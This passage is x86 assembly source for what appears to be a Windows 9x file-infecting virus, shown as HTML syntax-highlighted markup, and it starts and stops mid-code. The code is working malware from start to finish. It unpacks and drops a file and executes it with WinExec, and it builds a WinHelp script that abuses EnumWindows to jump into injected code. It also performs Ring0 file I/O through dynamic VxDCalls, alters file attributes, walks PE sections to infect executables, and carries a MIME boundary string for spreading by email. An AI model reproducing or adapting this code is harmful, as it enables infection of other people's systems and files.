       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_aP_depack_asm</span><span class="sc0">                     </span><span class="sc1">;unpack updater data</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">dropname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_open</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@no_ready</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">mem_temp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_write</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">r3_close</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">dropname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
  </span><span class="sc5">_winexec</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

  </span><span class="sc5">@@no_ready</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">i_jmp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@pe_exe</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wsize</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;stop enumeration</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                   </span><span class="sc1">;return to callback</span><span class="sc0">
  </span><span class="sc5">@@pe_exe</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">wsize</span><span class="sc4">+(</span><span class="sc2">9</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                              </span><span class="sc1">;return place</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
  </span><span class="sc5">instr1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">instr2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wsize</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;return to same place!</span><span class="sc0">
</span><span class="sc5">virusmain</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">hlp1_s</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_label1</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_label2</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_label2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RR(`USER32.DLL',`EnumWindows',`SU')"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_label1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_size</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">p1</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"EnumWindows(`"</span><span class="sc0">
</span><span class="sc5">hlp1_e</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">hlp1_sz</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">hlp1_e</span><span class="sc4">-</span><span class="sc5">hlp1_s</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"',666)"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                          </span><span class="sc1">;29A</span><span class="sc0">
</span><span class="sc5">hlp2_e</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">hlp2_sz</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">hlp2_e</span><span class="sc4">-</span><span class="sc5">hlp1_e</span><span class="sc0">


</span><span class="sc5">check</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">checkv</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@again_1</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
  </span><span class="sc5">@@again_1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@again</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">checkv</span><span class="sc0">                             </span><span class="sc1">;eax was validated?</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@again</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                           </span><span class="sc1">;edx is valid modifier?</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">checkv</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@again</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">check</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">rnd</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@2</span><span class="sc0">
       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">v2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">87654321h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">v2</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">;get rnd number</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">rnd</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">checkv</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"'"</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"`"</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">"\"
</span><span class="sc0">       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                              </span><span class="sc1">;check for invalid characters</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">                                </span><span class="sc1">;for hlp script</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
  </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">checkv</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">open</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getatt</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">attr</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">setatt</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">fname</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D500h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2022h</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">io</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">open</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">getsize</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D800h</span><span class="sc0">
 </span><span class="sc5">__2_</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__2__</span><span class="sc0">
</span><span class="sc5">getsize</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">close</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D700h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">__2_</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">attr</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">fname</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">                             </span><span class="sc1">;set old file attribute</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">setatt</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
  </span><span class="sc5">__2__</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__2___</span><span class="sc0">
</span><span class="sc5">setatt</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">getatt</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
  </span><span class="sc5">__2___</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__2</span><span class="sc0">
</span><span class="sc5">getatt</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">write</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D601h</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__2___</span><span class="sc0">
</span><span class="sc5">write</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">read</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D600h</span><span class="sc0">
  </span><span class="sc5">__2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
  </span><span class="sc5">handle</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">read</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">io</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">eax_value</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00400032h</span><span class="sc0">                          </span><span class="sc1">;Ring0_IO</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">io</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">vxd</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">@@int</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">20cdh</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">@@jmp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">@@jmp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">@@address</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;dynamic VxDCall building</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
    </span><span class="sc5">eax_value</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">@@int</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
  </span><span class="sc5">@@address</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
  </span><span class="sc5">@@jmp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vxd</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">bound_</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'OUNDARY="'</span><span class="sc0">
</span><span class="sc5">bound_sz</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bound_</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">rva2raw</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc9">section</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">            </span><span class="sc1">;first section</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">pe_hdr</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">
  </span><span class="sc5">@@section</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">@@found</span><span class="sc0">                             </span><span class="sc1">;point inside section</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">40</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@section</span><span class="sc0">
